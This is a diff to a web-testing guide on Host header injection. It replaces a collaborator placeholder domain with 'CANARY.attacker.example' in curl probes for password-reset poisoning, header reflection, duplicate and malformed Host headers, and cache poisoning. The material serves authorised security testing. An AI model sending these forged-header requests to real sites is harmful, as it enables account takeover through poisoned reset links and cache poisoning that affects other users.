@@ -61,11 +61,11 @@ Manual patterns: `ServletRequest.getServerName()`, Flask `request.host`, Django 
 
 ```bash
 curl -X POST https://TARGET/forgot-password \
-  -H "Host: YOUR-COLLABORATOR.oast.fun" \
+  -H "Host: CANARY.attacker.example" \
   -d "email=victim@example.com"
 
 curl -X POST https://TARGET/forgot-password \
-  -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun" \
+  -H "X-Forwarded-Host: CANARY.attacker.example" \
   -d "email=victim@example.com"
 ```
 
@@ -74,10 +74,10 @@ Confirmed when the reset email or link contains the injected hostname.
 **Host override variants** — probe reflection or routing changes:
 
 ```bash
-curl -s https://TARGET/ -H "Host: YOUR-COLLABORATOR.oast.fun"
-curl -s https://TARGET/ -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun"
-curl -s https://TARGET/ -H "X-Host: YOUR-COLLABORATOR.oast.fun"
-curl -s https://TARGET/ -H "X-Forwarded-Server: YOUR-COLLABORATOR.oast.fun"
+curl -s https://TARGET/ -H "Host: CANARY.attacker.example"
+curl -s https://TARGET/ -H "X-Forwarded-Host: CANARY.attacker.example"
+curl -s https://TARGET/ -H "X-Host: CANARY.attacker.example"
+curl -s https://TARGET/ -H "X-Forwarded-Server: CANARY.attacker.example"
 ```
 
 **Duplicate / malformed Host** — some stacks honor the second header or mangle authority:
@@ -85,9 +85,9 @@ curl -s https://TARGET/ -H "X-Forwarded-Server: YOUR-COLLABORATOR.oast.fun"
 ```bash
 curl https://TARGET/ \
   -H "Host: TARGET" \
-  -H "Host: YOUR-COLLABORATOR.oast.fun"
+  -H "Host: CANARY.attacker.example"
 
-curl https://TARGET/ -H "Host: TARGET:@YOUR-COLLABORATOR.oast.fun"
+curl https://TARGET/ -H "Host: TARGET:@CANARY.attacker.example"
 ```
 
 **Absolute-URI line** — request line authority can override Host on some proxies:
@@ -101,8 +101,8 @@ Host: TARGET
 
 ```bash
 curl -s https://TARGET/ \
-  -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun" -D- | grep -i x-cache
-curl -s https://TARGET/ | grep "YOUR-COLLABORATOR.oast.fun"
+  -H "X-Forwarded-Host: CANARY.attacker.example" -D- | grep -i x-cache
+curl -s https://TARGET/ | grep "CANARY.attacker.example"
 ```
 
 A follow-up request without the injected header still serving the attacker domain confirms cache poisoning (see `web_cache_deception.md`).
